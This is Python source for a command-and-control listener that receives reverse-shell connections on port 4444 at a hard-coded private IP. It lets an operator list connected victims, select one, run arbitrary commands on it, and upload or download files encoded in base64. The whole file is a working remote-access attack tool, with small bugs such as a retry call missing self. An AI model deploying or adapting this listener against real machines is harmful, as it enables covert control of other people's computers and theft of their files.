import socket, os
import json
import base64
import sys
import threading
import time
from queue import Queue


class Listener:
    def __init__(self,ip,port): 
        self.NUMBER_OF_THREADS = 2
        self.JOB_NUMBER = [1, 2]
        self.queue = Queue() 
        self.all_connections = []
        self.all_address = []
        self.host = ip
        self.port = port
        self.listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
              
        
   
    # Binding the socket and listening for connections
    def bind_socket(self):
        try:
            print("[+] Binding the Port: " + str(self.port))

            self.listner.bind((self.host, self.port))
            self.listner.listen(5)
        except socket.error as msg:
            print("[-] Socket Binding error" + str(msg) + "\n" + "Retrying...")
            bind_socket()


    # Handling connection from multiple clients and saving to a list
    # Closing previous connections when server.py file is restarted

    def accepting_connections(self):
        for c in self.all_connections:
            c.close()

        del self.all_connections[:]
        del self.all_address[:]

        while True:
            try:
                print("[+] Waiting for connection.............\n")
                connection, address = self.listner.accept()
                self.listner.setblocking(1)  # prevents timeout
                self.all_connections.append(connection)
                self.all_address.append(address)
                # print("[+] Got a connection from {addr}".format(addr=address[0]))
                print("Connection has been established :" + address[0])

            except Exception as error:
                print("Error during accepting connections",error)


    def list_connections(self):
        results = ''

        for i, conn in enumerate(self.all_connections):
            try:
                json_data = json.dumps('')
                conn.send(json_data.encode())
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_address[i]
                continue

            results = str(i) + "   " + str(self.all_address[i][0]) + "   " + str(self.all_address[i][1]) + "\n"

        # print("----Clients----" + "\n")
        return results

    def reliable_send(self,connection,data):
        json_data = json.dumps(data)
        connection.send(json_data.encode())


    def reliable_recieve(self,connection):
        json_data = b""
        while True:
            try:
                json_data = json_data + connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
        

    def execute_remotely(self,connection,command):
        self.reliable_send(connection,command)

        if command[0] == "exit":
            connection.close()
            sys.exit()
        
        return self.reliable_recieve(connection)

    def write_file(self,path,content):
        with open(path,'wb') as file:
            file.write(base64.b64decode(content))

            return "[+] Download successfull"

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())



    # Selecting the target
    def get_target(self,cmd):
        try:
            target = cmd.replace('select ', '')  # target = id
            target = int(target)
            connection = self.all_connections[target]
            print("You are now connected to :" + str(self.all_address[target][0]))
            # print(str(self.all_address[target][0]) + ">", end="")
            return connection
            # 192.168.0.4> dir

        except Exception as error:
            print("Selection not valid",error)
            return None


    # Create worker threads
    def create_workers(self):
        for _ in range(self.NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()


    # Do next job that is in the queue (handle connections, send commands)
    def work(self):
        while True:
            x = self.queue.get()
            if x == 1:
                self.bind_socket()
                self.accepting_connections()
            if x == 2:
                self.run()

            self.queue.task_done()


    def create_jobs(self):
        for x in self.JOB_NUMBER:
            self.queue.put(x)

        self.queue.join()
            
    def connect_to_client(self,connection):

        while True:
            try:
                command = input("{addr} >".format(addr=connection.getpeername()[0]))
                command = command.split(" ")
                if command[0] == "back":
                    self.run()
                if command[0] == "upload":
                    file_content = self.read_file(command[1]).decode()
                    command.append(file_content)


                result = self.execute_remotely(connection,command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1],result)
            except Exception as error:
                print(error)

            print(result)


    def run(self):

        while True:
            try:

                command = input("command >>")
                   
                if command == 'list':
                    result = self.list_connections()
                if 'select' in command:
                    connection = self.get_target(command)
                    if connection is not None:
                        self.connect_to_client(connection)

               
            except Exception as error:
                result = "[-] Oops Something went wrong"
                print(error)
            

            print(result)





my_listener = Listener("192.168.110.128",4444)
my_listener.create_workers()
my_listener.create_jobs()

# create_workers()
# create_jobs()
